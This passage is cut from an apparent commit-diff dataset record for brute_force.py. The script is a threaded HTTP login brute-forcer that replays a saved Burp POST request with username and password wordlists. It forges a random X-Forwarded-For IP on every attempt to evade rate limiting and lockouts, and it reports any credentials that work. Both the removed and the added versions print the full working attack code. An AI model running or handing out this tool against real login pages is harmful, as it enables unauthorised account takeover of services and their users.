sys.argv[2].strip()","            self.path_to_password_list = sys.argv[3].strip()","            self.amount_of_threads = int(sys.argv[4].strip())","        except IndexError:","            print(\"\\nYou have to call the program like that: \\n\")","            print(\"\\t\\033[1m\" + \"python3 *program* *request* *user_list* *password_list* *amount_of_threads*\\n\")","            print(\"\\033[0m\" + \"Recommondation: 10 Threads\\nThe rest will be interactive.\")","            exit()","    def open_file(self, file_path):","        try:","            file = open(file_path, \"r\")","            return file","        except FileNotFoundError:","            print(\"\\nThe request file was not found, exiting...\")","            exit()","    def read_wordlist(self, file):","            lines_not_stripped = file.readlines()","            lines_stripped = [row.strip() for row in lines_not_stripped]","            return lines_stripped","    def read_and_format_request(self, req):","        request = repr(req.read())","        if request == \"\":","            print(\"The request file is empty, exiting...\")","            exit()","        request = request[1:len(request)-1]","        return request","    def get_row_content(self, row):","        return self.content_request_file[row - 1]","    def open_read_and_save_file_content(self):","        self.request_file = self.open_file(self.path_to_request_file)","        self.user_list = self.open_file(self.path_to_user_list)","        self.password_list = self.open_file(self.path_to_password_list)","        self.content_user_list = self.read_wordlist(self.user_list)","        self.content_password_list = self.read_wordlist(self.password_list)","        self.content_request_not_per_line = self.read_and_format_request(self.request_file)","        self.content_request_file = [row for row in self.content_request_not_per_line.split('\\\\n')]","    def checking_for_invalid_http_method(self):","        if not self.content_request_file[0].startswith(\"POST\"):","            print(\"The request method must be POST\")","            exit()","    def headers_end_at(self):","        row = 0","        for x in self.content_request_file:","            if x == \"\":","                return row","            row+=1","    def pull_headers_into_dict(self):","        self.headers = {}","        for x in range(1, self.headers_end_at()):","            self.headers[self.content_request_file[x].split(\":\", 1)[0]] = self.content_request_file[x].split(\":\", 1)[1].split(\" \", 1)[1]","    def pull_and_format_data_to_be_sent(self):","        try:","            self.keyandvalue = {}  ####WARNING, I NEED TO CHECK THIS PART","            for row in range(self.headers_end_at()+1, len(self.content_request_file)-1):","                for x in range(self.content_request_file[row].count(\"&\")+1):","                    self.keyandvalue[self.content_request_file[row].split(\"&\")[x].split(\"=\")[0]] = self.content_request_file[row].split(\"&\")[x].split(\"=\")[1]","        except IndexError:","            print(\"You probably have some empty lines at the bottom of your request.\\n\")","            print(\"Make sure to use the \\\"save request\\\" option inside burp\")","    def ask_user_for_more_data(self):","        print(\"\"\""]},{"diff":"\n \n \n-\t\"\"\")\n-\n-\n-#---------------------------------------------------------------------\n-\n-try:\n-\trequest_file = sys.argv[1].strip()\n-\tpath_to_wordlist = sys.argv[2].strip()\n-except IndexError:\n-\tprint(\"\\nYou have to call the program like that: \\n\")\n-\tprint(\"\\t\\033[1m\" + \"python3 program.py requestfile wordlist\\n\")\n-\tprint(\"\\033[0m\" + \"The rest will be interactive.\")\n-\texit()\n-\n-\n-#Open the request file\n-try: \n-\trequest_file = open(request_file, \"r\")\n-except FileNotFoundError:\n-\tprint(\"\\n The request file was not found, exiting...\")\n-\texit()\n-\n-#Open the wordlist file\n-try: \n-\twordlist_file = open(path_to_wordlist, \"r\")\n-except FileNotFoundError:\n-\tprint(\"\\n The wordlist file was not found, exiting...\")\n-\texit()\n-\n-\n-#Read the request file with new line characters\n-request_file_content = repr(request_file.read())\n-\n-if request_file_content == \"\":\n-\tprint(\"The request file is empty, exiting...\\n\")\n-\texit()\n-\n-#Read the wordlist file without new line characters\n-wordlist_file_content_per_file_not_stripped = wordlist_file.readlines()\n-wordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]\n-\n-#Format the content\n-request_file_content = request_file_content[1:len(request_file_content)-1]\n-\n-#Get amount of rows of the request file \n-amount_of_rows_in_request_file = request_file_content.count('\\\\n') +1\n-\n-#Create a list with all rows\n-row_content_request_file = [row for row in request_file_content.split('\\\\n')]\n-\n-def getRowContent(row):\n-\treturn row_content_request_file[row-1]\n-\n-#Checking for POST method:\n-if not getRowContent(1).startswith(\"POST\"):\n-\tprint(\"The request method must be POST\")\n-\texit()\n-\n-if (row_content_request_file[len(row_content_request_file)-1]) == \"\":\n-\tdel row_content_request_file[len(row_content_request_file)-1]\n-\n-#---------------------------------------------------------------------\n-\n-#Get headers and put into a set\n-def headersEndAt():\n-\trow = 0\n-\tfor x in row_content_request_file:\n-\t\tif x == \"\":\n-\t\t\treturn row\n-\t\trow+=1\n-\n-headers = set()\n-\n-headersAreOverInLine = headersEndAt()\n-\n-for x in range(1, headersAreOverInLine):\n-\theaders.add(row_content_request_file[x])\n-\n-#print(headers)\n-#---------------------------------------------------------------------\n-\n-#Get parameters and choose two, one password and one username\n-\n-arguments = []\n-\n-keyandvalue = []\n-\n-amount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')\n-\n-password_argument = \"\"\n-\n-username_or_email_argument = \"\"\n+    \"\"\")\n+\n+\n+        ###########################\n+        #Ask for username argument#\n+        ###########################\n+        print(\"\\nChoose the argument for the username OR email BY NUMBER:\\n\")\n+        tempListUser = []\n+        for x in self.keyandvalue:\n+            tempListUser.append(x)\n+        i = 1\n+        #print(tempListUser)\n+\n+        for x in tempListUser:\n+            print(f\"[{i}] {x}\")\n+            i = i + 1\n+        try:\n+            user_input = int(input(\"> \"))\n+        except ValueError:\n+            print(\"\\nERROR: Enter a number next time\")\n+            exit()\n+        \n+        if user_input>len(self.keyandvalue) or user_input == \"\" or user_input < 1:\n+            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")\n+            exit()\n+        try:\n+            self.username_argument = tempListUser[user_input-1]\n+        except IndexError:\n+            print(tempListUser)\n+\n+        ###########################\n+        #Ask for password argument#\n+        ###########################\n+\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Choose the argument for the password BY NUMBER:\\n\")\n+        \n+        ii = 1\n+        for x in tempListUser:\n+            print(f\"[{ii}] {x}\")\n+            ii = ii + 1\n+        try:\n+            password_input = int(input(\"> \"))\n+        except ValueError:\n+            print(\"ERROR: Enter a number next time\")\n+            exit()\n+        if password_input>len(self.keyandvalue) or password_input == \"\" or password_input < 1 or password_input == user_input:\n+            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")\n+            exit()\n+        self.password_argument = tempListUser[password_input-1]\n+\n+        ###########################\n+        ### Invalid Credentials ###\n+        ###########################\n+\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Now enter a text that you ONLY get when you enter invalid credentials:\\n\")\n+        self.invalid_credentials_output = input(\"> \")\n+\n+        ###########################\n+        ###### SSL Encryption #####\n+        ###########################\n+\n+        self.ssl_encryption = None\n+        print(\"\\n=================================================================\\n\")\n+        print(\"Does it use SSL encryption?\\n\")\n+        print(\"[1] yes\\n[2] no\")\n+        temp3 = int(input(\"> \"))\n+        if temp3 == 1:\n+            self.ssl_encryption = True\n+        elif temp3 == 2:\n+            self.ssl_encryption = False\n+        else:\n+            print(\"That was not an option, exiting...\")\n+            exit()\n+        print(\"\\n=================================================================\\n\")\n+\n+    def concatenate_url(self):\n+        partone = self.headers[\"Host\"]\n+        temp = self.content_request_file[0][5::]\n+        parttwo = temp.split(' ')[0]\n+        self.url = partone + parttwo\n+        if self.ssl_encryption == True:\n+            self.url = \"https:\/\/\" + self.url\n+        else:\n+            self.url = \"http:\/\/\" + self.url\n+        if self.url == \"\":\n+            print(\"You don't have a HOST header set. Please set it and retry.\")\n+            exit()\n+\n+    def create_queue(self):\n+        self.username_queue = queue.Queue()\n+        self.password_queue = queue.Queue()\n+\n+        amount_of_rows_pass_file = len(self.content_password_list)\n+        amount_of_rows_pass_user = len(self.content_user_list)\n+\n+        print(\"##################################################\")\n+        print(f\"Loading username and password file {(amount_of_rows_pass_file+amount_of_rows_pass_user)} lines\")\n+        print(\"##################################################\\n\")\n+\n+        for username in self.content_user_list:\n+            for password in self.content_password_list:\n+                self.username_queue.put(username)\n+\n+        for username in self.content_user_list:\n+            for password in self.content_password_list:\n+                self.password_queue.put(password)\n+\n+        self.queue_list2 = list(self.password_queue.queue)\n+        #print(f\"\\n{self.queue_list2}\\n\")\n+\n+        self.queue_list = list(self.username_queue.queue)\n+        #print(f\"\\n{self.queue_list}\\n\")\n+\n+\n+    def brute_force(self):\n+        for i in range(len(self.queue_list)+1):\n+            data = {}\n+            for x in self.keyandvalue:\n+                if x.split('=')[0] == self.username_argument:\n+                    data[self.username_argument] = self.username_queue.get().strip()\n+                elif x.split('=')[0] == self.password_argument:\n+                    data[self.password_argument] = self.password_queue.get().strip()\n+                else:\n+                    data[x.split('=')[0]] = x.split('=')[1]\n+            ip = \".\".join(str(random.randint(0, 255)) for _ in range(4))\n+            self.headers['X-Forwarded-For'] = ip\n+            response = requests.post(self.url, headers=self.headers, data=data)\n+            time.sleep(1)\n+            if str(self.invalid_credentials_output) in str(response.content):\n+                print(f\"[-] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\")\n+            else:\n+                print(\"\\n\\n(One) Password Found:\\n\")\n+                print(f\"[+] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\\n\")\n+                os._exit(0)\n+\n+    def create_threads(self):\n+        self.threads = []\n+        for x in range(self.amount_of_threads):\n+            thread = threading.Thread(target=self.brute_force)\n+            self.threads.append(thread)\n+\n+        for thread in self.threads:\n+            thread.start()\n+            time.sleep(0.1)\n+\n+    def close_file(self, file):\n+        file.close()\n+        \n+    def close_files(self):\n+        self.close_file(self.request_file)\n+        self.close_file(self.user_list)\n+        self.close_file(self.password_list)\n+\n+    def start(self):\n+        self.open_read_and_save_file_content()\n+        self.checking_for_invalid_http_method()\n+        self.pull_headers_into_dict()\n+        self.pull_and_format_data_to_be_sent()\n+        self.ask_user_for_more_data()\n+        self.concatenate_url()\n+        self.close_files()\n+        self.create_queue()\n+        self.create_threads()\n+\n+\n+if __name__ == \"__main__\":\n+    app = App()\n+    app.start()\n \n-ssl_encryption = False\n-\n-def getArguments():\n-\tglobal keyandvalue\n-\tglobal arguments\n-\tkeyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')\n-\tfor x in keyandvalue:\n-\t\targuments.append(x.split('=')[0])\n-\t\n-getArguments()\n-\n-def outputPossibleUsernamesAndPasswords():\n-\tglobal arguments\n-\tglobal username_or_email_argument\n-\tglobal password_argument\n-\tprint(\"\\n\")\n-\tprint(\"Choose the argument for the username OR email BY NUMBER:\\n\")\n-\titeratorUsername = 1\n-\tfor x in arguments:\n-\t\tprint(f\"[{iteratorUsername}] \\\"{x}\\\"\\n\")\n-\t\titeratorUsername+=1\n-\ttry:\n-\t\tuinput = int(input(\"> \"))\n-\texcept ValueError:\n-\t\tprint(\"ERROR: Enter a number next time\")\n-\t\texit()\n-\tif uinput>len(arguments) or uinput == \"\":\n-\t\tprint(\"Couldn't find that argument, exiting...\")\n-\t\texit()\n-\t\t#EDIT, WHEN STRING IS ENTERED, LEAVE\n-\tusername_or_email_argument = arguments[uinput-1]\n-\tprint(\"\\n\")\n-\tprint(\"=================================================================\\n\")\n-\tprint(\"Choose the argument for the password BY NUMBER:\\n\")\n-\titeratorPassword = 1\n-\tfor x in arguments:\n-\t\tprint(f\"[{iteratorPassword}] \\\"{x}\\\"\\n\")\n-\t\titeratorPassword+=1\n-\ttry:\n-\t\tpinput = int(input(\"> \"))\n-\texcept ValueError:\n-\t\tprint(\"ERROR: Enter a number next time\")\n-\t\texit()\n-\tif uinput == pinput or uinput == \"\":\n-\t\tprint(\"WARNING: YOU SELECTED THE SAME FIELD TWICE!\\n\")\n-\t\tprint(f\"So you selected the field {username_or_email_argument} for username and password, which makes no sense\\n\")\n-\t\texit()\n-\telif pinput > len(arguments):\n-\t\tprint(\"Couldn't find the argument, exiting...\")\n-\t\texit()\n-\n-\tpassword_argument = arguments[pinput-1]\n-\tprint(\"\\n\")\n-\t#print(f\"Selected: {username_or_email_argument} as a username\/email field and {password_argument} as a password field\")\n-\n-outputPossibleUsernamesAndPasswords()\n-\n-\n-print(\"\\n\")\n-print(\"=================================================================\\n\")\n-print(\"Which username do you want to authenticate as when bruteforcing through the password list:\\n\")\n-username = input(\"> \")\n-\n-print(\"\\n\\n\")\n-print(\"=================================================================\\n\")\n-print(\"Now enter a text that you get when you enter invalid credentials:\\n\")\n-invalid_credentials_output = input(\"> \")\n-print(\"\\n\")\n-\n-print(\"=================================================================\\n\")\n-print(\"Does it use SSL encryption?\\n\")\n-print(\"[1] yes\\n[2] no\")\n-temp3 = int(input(\"> \"))\n-if temp3 == 1:\n-\tssl_encryption = True\n-elif temp3 == 2:\n-\tssl_encryption = False\n-else:\n-\tprint(\"That was not an option, exiting...\")\n-\texit()\n-\n-\n-#Formating headers, data and all the other stuff that is need\n-\n-headers_dict = {}\n-url = \"\"\n-\n-def convertHeaderSetIntoDict():\n-\tglobal headers_dict\n-\tfor x in headers:\n-\t\theaders_dict[x.split(\":\", 1)[0]] = x.split(\": \", 1)[1]\n-\n-\n-\n-convertHeaderSetIntoDict()\n-\n-\n-def concatenate_url():\n-\tglobal headers_dict\n-\tglobal ssl_encryption\n-\tglobal url\n-\tpartone = headers_dict[\"Host\"]\n-\ttemp = row_content_request_file[0][5::]\n-\tparttwo = temp.split(' ')[0]\n-\turl = partone + parttwo\n-\tif ssl_encryption == True:\n-\t\turl = \"https:\/\/\" + url\n-\telse:\n-\t\turl = \"http:\/\/\" + url\n-\n-concatenate_url()\n-\n-if url == \"\":\n-\tprint(\"URL was \\\"\\\"\")\n-\texit()\n-\n-print(\"\\n\")\n-print(\"\\n\")\n-print(\"Stating to brute force\")\n-\n-#BRUTE FORCING:\n-\n-for password in wordlist_file_content_per_file:\n-\n-\theaders_dict2 = headers_dict\n-\t\n-\t#print(headers_dict2)\n-\t#print(\"\\n\\n\")\n-\t#forging the data that is sent to the server\n-\tdata = {}\n-\ttemp = keyandvalue\n-\tfor x in keyandvalue:\n-\t\tif x.split('=')[0] == username_or_email_argument:\n-\t\t\tdata[username_or_email_argument] = username\n-\t\telif x.split('=')[0] == password_argument:\n-\t\t\tdata[password_argument] = password\n-\t\telse:\n-\t\t\tdata[x.split('=')[0]] = x.split('=')[1]\n-\t#print(\"\\n\")\n-\t#print(f\"Url {url}\")\n-\t#print(f\"Headers {headers_dict2}\")\n-\t#print(f\"Data {data}\")\n-\tip = \".\".join(str(random.randint(0, 255)) for _ in range(4))\n-\t#print(ip)\n-\theaders_dict2['X-Forwarded-For'] = ip\n-\t#print(headers_dict2)\n-\tresponse = requests.post(url, headers=headers_dict2, data=data)\n-\t#print(response.content)\n-\t#print(str(invalid_credentials_output))\n-\t#print(str(response.content))\n-\n-\tif str(invalid_credentials_output) in str(response.content):\n-\t\tprint(f\"[-] {password}\")\n-\n-\telse:\n-\t\tprint(\"\\n\")\n-\t\tprint(\"\\n\")\n-\t\tprint(\"(One) Password Found:\\n\")\n-\t\tprint(f\"[+] {password}\\n\")\n-\t\texit()\n-\n-\n-request_file.close()\n-wordlist_file.close()\n-\n-\n-#print(data)\n","add":170,"remove":259,"filename":"\/brute_force.py","badparts":["\t\"\"\")","try:","\trequest_file = sys.argv[1].strip()","\tpath_to_wordlist = sys.argv[2].strip()","except IndexError:","\tprint(\"\\nYou have to call the program like that: \\n\")","\tprint(\"\\t\\033[1m\" + \"python3 program.py requestfile wordlist\\n\")","\tprint(\"\\033[0m\" + \"The rest will be interactive.\")","\texit()","try: ","\trequest_file = open(request_file, \"r\")","except FileNotFoundError:","\tprint(\"\\n The request file was not found, exiting...\")","\texit()","try: ","\twordlist_file = open(path_to_wordlist, \"r\")","except FileNotFoundError:","\tprint(\"\\n The wordlist file was not found, exiting...\")","\texit()","request_file_content = repr(request_file.read())","if request_file_content == \"\":","\tprint(\"The request file is empty, exiting...\\n\")","\texit()","wordlist_file_content_per_file_not_stripped = wordlist_file.readlines()","wordlist_file_content_per_file = [row.strip() for row in wordlist_file_content_per_file_not_stripped]","request_file_content = request_file_content[1:len(request_file_content)-1]","amount_of_rows_in_request_file = request_file_content.count('\\\\n') +1","row_content_request_file = [row for row in request_file_content.split('\\\\n')]","def getRowContent(row):","\treturn row_content_request_file[row-1]","if not getRowContent(1).startswith(\"POST\"):","\tprint(\"The request method must be POST\")","\texit()","if (row_content_request_file[len(row_content_request_file)-1]) == \"\":","\tdel row_content_request_file[len(row_content_request_file)-1]","def headersEndAt():","\trow = 0","\tfor x in row_content_request_file:","\t\tif x == \"\":","\t\t\treturn row","\t\trow+=1","headers = set()","headersAreOverInLine = headersEndAt()","for x in range(1, headersAreOverInLine):","\theaders.add(row_content_request_file[x])","arguments = []","keyandvalue = []","amount_of_arguments = row_content_request_file[len(row_content_request_file)-1].count('=')","password_argument = \"\"","username_or_email_argument = \"\"","ssl_encryption = False","def getArguments():","\tglobal keyandvalue","\tglobal arguments","\tkeyandvalue = row_content_request_file[len(row_content_request_file)-1].split('&')","\tfor x in keyandvalue:","\t\targuments.append(x.split('=')[0])","\t","getArguments()","def outputPossibleUsernamesAndPasswords():","\tglobal arguments","\tglobal username_or_email_argument","\tglobal password_argument","\tprint(\"\\n\")","\tprint(\"Choose the argument for the username OR email BY NUMBER:\\n\")","\titeratorUsername = 1","\tfor x in arguments:","\t\tprint(f\"[{iteratorUsername}] \\\"{x}\\\"\\n\")","\t\titeratorUsername+=1","\ttry:","\t\tuinput = int(input(\"> \"))","\texcept ValueError:","\t\tprint(\"ERROR: Enter a number next time\")","\t\texit()","\tif uinput>len(arguments) or uinput == \"\":","\t\tprint(\"Couldn't find that argument, exiting...\")","\t\texit()","\tusername_or_email_argument = arguments[uinput-1]","\tprint(\"\\n\")","\tprint(\"=================================================================\\n\")","\tprint(\"Choose the argument for the password BY NUMBER:\\n\")","\titeratorPassword = 1","\tfor x in arguments:","\t\tprint(f\"[{iteratorPassword}] \\\"{x}\\\"\\n\")","\t\titeratorPassword+=1","\ttry:","\t\tpinput = int(input(\"> \"))","\texcept ValueError:","\t\tprint(\"ERROR: Enter a number next time\")","\t\texit()","\tif uinput == pinput or uinput == \"\":","\t\tprint(\"WARNING: YOU SELECTED THE SAME FIELD TWICE!\\n\")","\t\tprint(f\"So you selected the field {username_or_email_argument} for username and password, which makes no sense\\n\")","\t\texit()","\telif pinput > len(arguments):","\t\tprint(\"Couldn't find the argument, exiting...\")","\t\texit()","\tpassword_argument = arguments[pinput-1]","\tprint(\"\\n\")","outputPossibleUsernamesAndPasswords()","print(\"\\n\")","print(\"=================================================================\\n\")","print(\"Which username do you want to authenticate as when bruteforcing through the password list:\\n\")","username = input(\"> \")","print(\"\\n\\n\")","print(\"=================================================================\\n\")","print(\"Now enter a text that you get when you enter invalid credentials:\\n\")","invalid_credentials_output = input(\"> \")","print(\"\\n\")","print(\"=================================================================\\n\")","print(\"Does it use SSL encryption?\\n\")","print(\"[1] yes\\n[2] no\")","temp3 = int(input(\"> \"))","if temp3 == 1:","\tssl_encryption = True","elif temp3 == 2:","\tssl_encryption = False","else:","\tprint(\"That was not an option, exiting...\")","\texit()","headers_dict = {}","url = \"\"","def convertHeaderSetIntoDict():","\tglobal headers_dict","\tfor x in headers:","\t\theaders_dict[x.split(\":\", 1)[0]] = x.split(\": \", 1)[1]","convertHeaderSetIntoDict()","def concatenate_url():","\tglobal headers_dict","\tglobal ssl_encryption","\tglobal url","\tpartone = headers_dict[\"Host\"]","\ttemp = row_content_request_file[0][5::]","\tparttwo = temp.split(' ')[0]","\turl = partone + parttwo","\tif ssl_encryption == True:","\t\turl = \"https:\/\/\" + url","\telse:","\t\turl = \"http:\/\/\" + url","concatenate_url()","if url == \"\":","\tprint(\"URL was \\\"\\\"\")","\texit()","print(\"\\n\")","print(\"\\n\")","print(\"Stating to brute force\")","for password in wordlist_file_content_per_file:","\theaders_dict2 = headers_dict","\t","\tdata = {}","\ttemp = keyandvalue","\tfor x in keyandvalue:","\t\tif x.split('=')[0] == username_or_email_argument:","\t\t\tdata[username_or_email_argument] = username","\t\telif x.split('=')[0] == password_argument:","\t\t\tdata[password_argument] = password","\t\telse:","\t\t\tdata[x.split('=')[0]] = x.split('=')[1]","\tip = \".\".join(str(random.randint(0, 255)) for _ in range(4))","\theaders_dict2['X-Forwarded-For'] = ip","\tresponse = requests.post(url, headers=headers_dict2, data=data)","\tif str(invalid_credentials_output) in str(response.content):","\t\tprint(f\"[-] {password}\")","\telse:","\t\tprint(\"\\n\")","\t\tprint(\"\\n\")","\t\tprint(\"(One) Password Found:\\n\")","\t\tprint(f\"[+] {password}\\n\")","\t\texit()","request_file.close()","wordlist_file.close()"],"goodparts":["    \"\"\")","        print(\"\\nChoose the argument for the username OR email BY NUMBER:\\n\")","        tempListUser = []","        for x in self.keyandvalue:","            tempListUser.append(x)","        i = 1","        for x in tempListUser:","            print(f\"[{i}] {x}\")","            i = i + 1","        try:","            user_input = int(input(\"> \"))","        except ValueError:","            print(\"\\nERROR: Enter a number next time\")","            exit()","        if user_input>len(self.keyandvalue) or user_input == \"\" or user_input < 1:","            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")","            exit()","        try:","            self.username_argument = tempListUser[user_input-1]","        except IndexError:","            print(tempListUser)","        print(\"\\n=================================================================\\n\")","        print(\"Choose the argument for the password BY NUMBER:\\n\")","        ii = 1","        for x in tempListUser:","            print(f\"[{ii}] {x}\")","            ii = ii + 1","        try:","            password_input = int(input(\"> \"))","        except ValueError:","            print(\"ERROR: Enter a number next time\")","            exit()","        if password_input>len(self.keyandvalue) or password_input == \"\" or password_input < 1 or password_input == user_input:","            print(\"1. Couldn't find that argument\\n2. You chose the same argument both times, exiting...\")","            exit()","        self.password_argument = tempListUser[password_input-1]","        print(\"\\n=================================================================\\n\")","        print(\"Now enter a text that you ONLY get when you enter invalid credentials:\\n\")","        self.invalid_credentials_output = input(\"> \")","        self.ssl_encryption = None","        print(\"\\n=================================================================\\n\")","        print(\"Does it use SSL encryption?\\n\")","        print(\"[1] yes\\n[2] no\")","        temp3 = int(input(\"> \"))","        if temp3 == 1:","            self.ssl_encryption = True","        elif temp3 == 2:","            self.ssl_encryption = False","        else:","            print(\"That was not an option, exiting...\")","            exit()","        print(\"\\n=================================================================\\n\")","    def concatenate_url(self):","        partone = self.headers[\"Host\"]","        temp = self.content_request_file[0][5::]","        parttwo = temp.split(' ')[0]","        self.url = partone + parttwo","        if self.ssl_encryption == True:","            self.url = \"https:\/\/\" + self.url","        else:","            self.url = \"http:\/\/\" + self.url","        if self.url == \"\":","            print(\"You don't have a HOST header set. Please set it and retry.\")","            exit()","    def create_queue(self):","        self.username_queue = queue.Queue()","        self.password_queue = queue.Queue()","        amount_of_rows_pass_file = len(self.content_password_list)","        amount_of_rows_pass_user = len(self.content_user_list)","        print(\"##################################################\")","        print(f\"Loading username and password file {(amount_of_rows_pass_file+amount_of_rows_pass_user)} lines\")","        print(\"##################################################\\n\")","        for username in self.content_user_list:","            for password in self.content_password_list:","                self.username_queue.put(username)","        for username in self.content_user_list:","            for password in self.content_password_list:","                self.password_queue.put(password)","        self.queue_list2 = list(self.password_queue.queue)","        self.queue_list = list(self.username_queue.queue)","    def brute_force(self):","        for i in range(len(self.queue_list)+1):","            data = {}","            for x in self.keyandvalue:","                if x.split('=')[0] == self.username_argument:","                    data[self.username_argument] = self.username_queue.get().strip()","                elif x.split('=')[0] == self.password_argument:","                    data[self.password_argument] = self.password_queue.get().strip()","                else:","                    data[x.split('=')[0]] = x.split('=')[1]","            ip = \".\".join(str(random.randint(0, 255)) for _ in range(4))","            self.headers['X-Forwarded-For'] = ip","            response = requests.post(self.url, headers=self.headers, data=data)","            time.sleep(1)","            if str(self.invalid_credentials_output) in str(response.content):","                print(f\"[-] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\")","            else:","                print(\"\\n\\n(One) Password Found:\\n\")","                print(f\"[+] Username: \\\"{data[self.username_argument]}\\\" & Password:\\\"{data[self.password_argument]}\\\"\\n\")","                os._exit(0)","    def create_threads(self):","        self.threads = []","        for x in range(self.amount_of_threads):","            thread = threading.Thread(target=self.brute_force)","            self.threads.append(thread)","        for thread in self.threads:","            thread.start()","            time.sleep(0.1)","    def close_file(self, file):","        file.close()","    def close_files(self):","        self.close_file(self.request_file)","        self.close_file(self.user_list)","        self.close_file(self.password_list)","    def start(self):","        self.open_read_and_save_file_content()","        self.checking_for_invalid_http_method()","        self.pull_headers_into_dict()","        self.pull_and_format_data_to_be_sent()","        self.ask_user_for_more_data()","        self.concatenate_url()","        self.close_files()","        self.create_queue()","        self.create_threads()","if __name__ == \"__main__\":","    app = App()","    app.start()"]}],"source":"\n import sys import requests import random import time print(\"\"\" Created by 44h ___________________________________________________________________________ ___________________________________________________________________________ _____ _____ \/ \/ \/ \/ \/ \/ \/ \/ . \/ \/ \/ \/ .'| \/ \/ \/ \/ < | \/ \/ __ \/ \/ __ | | \/ \/ | | \/ \/ | | | |.'''-. \/ ' | | \/ ' | | | |\/.'''. \\ \/ '----| |---. \/ '----| |---.| \/ | | \/ | | |\/ | | || | | | '----------| |---''----------| |---'| | | | | | | | | '. | '. \/____\\ \/____\\ '---' '---' ___________________________________________________________________________ ___________________________________________________________________________ \t\"\"\") try: \trequest_file=sys.argv[1].strip() \tpath_to_wordlist=sys.argv[2].strip() except IndexError: \tprint(\"\\nYou have to call the program like that: \\n\") \tprint(\"\\t\\033[1m\" +\"python3 program.py requestfile wordlist\\n\") \tprint(\"\\033[0m\" +\"The rest will be interactive.\") \texit() try: \trequest_file=open(request_file, \"r\") except FileNotFoundError: \tprint(\"\\n The request file was not found, exiting...\") \texit() try: \twordlist_file=open(path_to_wordlist, \"r\") except FileNotFoundError: \tprint(\"\\n The wordlist file was not found, exiting...\") \texit() request_file_content=repr(request_file.read()) if request_file_content==\"\": \tprint(\"The request file is empty, exiting...\\n\") \texit() wordlist_file_content_per_file_not_stripped=wordlist_file.readlines() wordlist_file_content_per_file=[row.strip() for row in wordlist_file_content_per_file_not_stripped] request_file_content=request_file_content[1:len(request_file_content)-1] amount_of_rows_in_request_file=request_file_content.count('\\\\n') +1 row_content_request_file=[row for row in request_file_content.split('\\\\n')] def getRowContent(row): \treturn row_content_request_file[row-1] if not getRowContent(1).startswith(\"POST\"): \tprint(\"The request method must be POST\") \texit() if(row_content_request_file[len(row_content_request_file)-1])==\"\": \tdel row_content_request_file[len(row_content_request_file)-1] def headersEndAt(): \trow=0 \tfor x in row_content_request_file: \t\tif x==\"\": \t\t\treturn row \t\trow+=1 headers=set() headersAreOverInLine=headersEndAt() for x in range(1, headersAreOverInLine): \theaders.add(row_content_request_file[x]) arguments=[] keyandvalue=[] amount_of_arguments=row_content_request_file[len(row_content_request_file)-1].count('=') password_argument=\"\" username_or_email_argument=\"\" ssl_encryption=False def getArguments(): \tglobal keyandvalue \tglobal arguments \tkeyandvalue=row_content_request_file[len(row_content_request_file)-1].split('&') \tfor x in keyandvalue: \t\targuments.append(x.split('=')[0]) \t getArguments() def outputPossibleUsernamesAndPasswords(): \tglobal arguments \tglobal username_or_email_argument \tglobal password_argument \tprint(\"\\n\") \tprint(\"Choose the argument for the username OR email BY NUMBER:\\n\") \titeratorUsername=1 \tfor x in arguments: \t\tprint(f\"[{iteratorUsername}] \\\"{x}\\\"\\n\") \t\titeratorUsername+=1 \ttry: \t\tuinput=int(input(\"> \")) \texcept ValueError: \t\tprint(\"ERROR: Enter a number next time\") \t\texit() \tif uinput>len(arguments) or uinput==\"\": \t\tprint(\"Couldn't find that argument, exiting...\") \t\texit() \t\t \tusername_or_email_argument=arguments[uinput-1] \tprint(\"\\n\") \tprint(\"=================================================================\\n\") \tprint(\"Choose the argument for the password BY NUMBER:\\n\") \titeratorPassword=1 \tfor x in arguments: \t\tprint(f\"[{iteratorPassword}] \\\"{x}\\\"\\n\") \t\titeratorPassword+=1 \ttry: \t\tpinput=int(input(\"> \")) \texcept ValueError: \t\tprint(\"ERROR: Enter a number next time\") \t\texit() \tif uinput==pinput or uinput==\"\": \t\tprint(\"WARNING: YOU SELECTED THE SAME FIELD TWICE!\\n\") \t\tprint(f\"So you selected the field{username_or_email_argument} for username and password, which makes no sense\\n\") \t\texit() \telif pinput > len(arguments): \t\tprint(\"Couldn't find the argument, exiting...\") \t\texit() \tpassword_argument=arguments[pinput-1] \tprint(\"\\n\") \t outputPossibleUsernamesAndPasswords() print(\"\\n\") print(\"=================================================================\\n\") print(\"Which username do you want to authenticate as when bruteforcing through the password list:\\n\") username=input(\"> \") print(\"\\n\\n\") print(\"=================================================================\\n\") print(\"Now enter a text that you get when you enter invalid credentials:\\n\") invalid_credentials_output=input(\"> \") print(\"\\n\") print(\"=================================================================\\n\") print(\"Does it use SSL encryption?\\n\") print(\"[1] yes\\n[2] no\") temp3=int(input(\"> \")) if temp3==1: \tssl_encryption=True elif temp3==2: \tssl_encryption=False else: \tprint(\"That was not an option, exiting...\") \texit() headers_dict={} url=\"\" def convertHeaderSetIntoDict(): \tglobal headers_dict \tfor x in headers: \t\theaders_dict[x.split(\":\", 1)[0]]=x.split(\": \", 1)[1] convertHeaderSetIntoDict() def concatenate_url(): \tglobal headers_dict \tglobal ssl_encryption \tglobal url \tpartone=headers_dict[\"Host\"] \ttemp=row_content_request_file[0][5::] \tparttwo=temp.split(' ')[0] \turl=partone +parttwo \tif ssl_encryption==True: \t\turl=\"https:\/\/\" +url \telse: \t\turl=\"http:\/\/\" +url concatenate_url() if url==\"\": \tprint(\"URL was \\\"\\\"\") \texit() print(\"\\n\") print(\"\\n\") print(\"Stating to brute force\") for password in wordlist_file_content_per_file: \theaders_dict2=headers_dict \t \t \t \t \tdata={} \ttemp=keyandvalue \tfor x in keyandvalue: \t\tif x.split('=')[0]==username_or_email_argument: \t\t\tdata[username_or_email_argument]=username \t\telif x.split('=')[0]==password_argument: \t\t\tdata[password_argument]=password \t\telse: 